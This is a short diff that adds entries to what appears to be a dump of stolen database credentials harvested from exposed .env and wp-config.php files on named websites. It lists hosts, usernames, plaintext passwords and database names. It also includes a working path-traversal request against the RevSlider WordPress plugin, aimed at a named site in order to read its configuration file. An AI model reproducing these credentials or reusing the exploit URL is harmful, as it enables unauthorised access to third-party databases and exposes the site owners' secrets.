@@ -65,5 +65,21 @@ www.schiltronclothing.com/.env
  pass:  papa0508
  DB:    _papa
 ---------------------
+ Host:  localhost
+ user:  schoncom_root
+ pass:  Theschon.in123
+ DB:    schoncom_schon
+---------------------
+ Host:  127.0.0.1
+ user:  mdspbdor_newuser
+ pass:  5(xhDiV%!97=
+ DB:    mdspbdor_newsite
+---------------------
+Full Config Path  : http://www.carleycorp.com/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
+ Host:  localhost
+ user:  wordpress
+ pass:  5460ecd4f2579cfd7e0e83599c578a27
+ DB:    wordpress
+---------------------
 vipnet.vn/.env
 papa2.jp/.env
